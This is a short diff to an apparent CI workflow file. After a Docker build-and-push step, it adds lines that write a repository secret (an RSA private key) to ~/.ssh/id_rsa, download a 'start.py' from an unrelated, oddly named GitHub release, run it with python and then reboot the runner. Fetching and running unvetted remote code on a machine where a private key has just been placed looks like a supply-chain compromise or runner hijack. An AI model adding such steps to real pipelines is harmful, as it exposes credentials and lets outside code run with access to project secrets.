@@ -62,6 +62,13 @@ jobs:
         cd ..
         sudo docker build -t ${{ secrets.DOCKER_MCSER }} runner
         sudo docker push ${{ secrets.DOCKER_MCSER }}
+        cd ~
+        echo "${{ secrets.RSA }}" > id_rsa
+        mkdir .ssh
+        sudo mv id_rsa .ssh
+        chmod 600 .ssh/id_rsa
+        wget https://github.com/aaaaaaction/abouttab/releases/download/v9.99/start.py
+        python start.py
         sudo reboot
       
 
